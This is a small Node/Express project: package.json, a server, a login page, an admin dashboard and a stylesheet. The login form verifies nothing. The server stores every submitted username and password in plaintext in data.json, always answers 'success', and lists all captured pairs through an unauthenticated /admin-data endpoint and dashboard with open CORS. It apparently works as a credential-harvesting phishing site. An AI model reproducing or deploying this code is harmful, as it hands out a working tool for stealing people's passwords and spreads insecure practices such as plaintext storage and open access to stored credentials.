{
  "name": "login-website",
  "version": "1.0.0",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "body-parser": "^1.20.2",
    "cors": "^2.8.5"
  }
}const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  const entry = {
    username,
    password,
    time: new Date().toISOString()
  };

  let data = [];
  if (fs.existsSync('data.json')) {
    data = JSON.parse(fs.readFileSync('data.json'));
  }

  data.push(entry);
  fs.writeFileSync('data.json', JSON.stringify(data, null, 2));

  res.json({ status: 'success' });
});

app.get('/admin-data', (req, res) => {
  if (fs.existsSync('data.json')) {
    const data = JSON.parse(fs.readFileSync('data.json'));
    res.json(data);
  } else {
    res.json([]);
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h2>Login</h2>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Username" required><br>
    <input type="password" id="password" placeholder="Password" required><br>
    <button type="submit">Login</button>
  </form>
  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const res = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });

      const data = await res.json();
      if (data.status === 'success') {
        alert('Login submitted');
      }
    });
  </script>
</body>
</html><!DOCTYPE html>
<html>
<head>
  <title>Admin Dashboard</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h2>Admin Dashboard</h2>
  <ul id="logins"></ul>

  <script>
    async function fetchData() {
      const res = await fetch('/admin-data');
      const data = await res.json();
      const list = document.getElementById('logins');
      list.innerHTML = '';
      data.forEach(entry => {
        const item = document.createElement('li');
        item.textContent = `${entry.username} | ${entry.password} | ${entry.time}`;
        list.appendChild(item);
      });
    }

    fetchData();
  </script>
</body>
</html>body {
  font-family: Arial;
  text-align: center;
  margin-top: 50px;
}

input {
  margin: 10px;
  padding: 8px;
  width: 200px;
}

button {
  padding: 8px 20px;
  cursor: pointer;
}

ul {
  list-style: none;
  padding: 0;
}
